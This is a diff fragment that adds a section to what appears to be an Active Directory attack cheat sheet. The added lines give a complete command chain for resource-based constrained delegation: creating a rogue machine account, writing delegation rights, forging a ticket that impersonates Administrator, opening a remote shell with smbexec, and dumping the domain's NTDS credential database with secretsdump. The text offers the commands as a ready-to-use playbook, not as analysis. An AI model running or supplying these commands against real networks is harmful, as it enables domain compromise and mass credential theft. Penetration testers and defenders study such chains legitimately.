@@ -16,3 +16,20 @@ nxc smb <DC_IP> -u <USER> -p '<PASS>'        # re-check — should now show Pwn3
 evil-winrm -i <DC_FQDN> -u <USER> -p '<PASS>'
 ```
 
+RBCD via a self-created machine account (works if `MachineAccountQuota` lets you create one):
+
+```bash
+addcomputer.py -computer-name 'ATTACKERSYSTEM$' -computer-pass '<PW>' \
+  -dc-host <DC_SHORTNAME> -domain-netbios <domain> '<domain>/<USER>:<PASS>'
+
+rbcd.py -dc-ip <DC_IP> -delegate-from 'ATTACKERSYSTEM$' \
+  -delegate-to '<DC_SHORTNAME>$' -action 'write' '<domain>/<USER>:<PASS>'
+
+getST.py -spn 'cifs/<DC_FQDN>' -impersonate 'Administrator' \
+  '<domain>/ATTACKERSYSTEM$:<PW>'
+
+export KRB5CCNAME=Administrator@cifs_<DC_FQDN>@<REALM>.ccache
+smbexec.py -k -no-pass <domain>/Administrator@<DC_FQDN>
+secretsdump.py -k -no-pass <domain>/Administrator@<DC_FQDN>   # full NTDS dump
+```
+
